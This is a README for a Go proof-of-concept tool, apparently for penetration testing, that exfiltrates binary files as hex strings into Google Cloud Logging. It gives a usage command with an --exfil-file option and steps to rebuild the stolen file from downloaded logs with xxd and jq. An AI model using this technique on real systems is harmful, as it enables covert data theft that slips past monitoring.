  
## Usage
Proof of concept data exfil binary files to cloud logging via hex string
Dennis Chow dchow[AT]xtecsystems.com March 26, 2023
No expressed warranty or liability.

Dependencies and environment setup

    go init gologexfil/main && go get cloud.google.com/logging

Usage: 
`go run main.go --service-cred <YOUR-ACC-CRED.json> --project-id <YOUR-GCP-PROJECTID> --exfil-file <PATH/TO/FILE.foo>`

Note: In pen testing do a go build first go build -o gologexfil ./main.go ensure you have already go get cloud.google.com/logging

Retrieve your file in GCP Cloud Logging either by console and dump to file e.g. cat dump.txt | xxd -r -p > somefile.ext

Alternatively use jq e.g.:

    jq -r '.[] | {textPayload} | select(.textPayload != null) | .textPayload' ./downloaded-logs.json > payload-hexdump.text

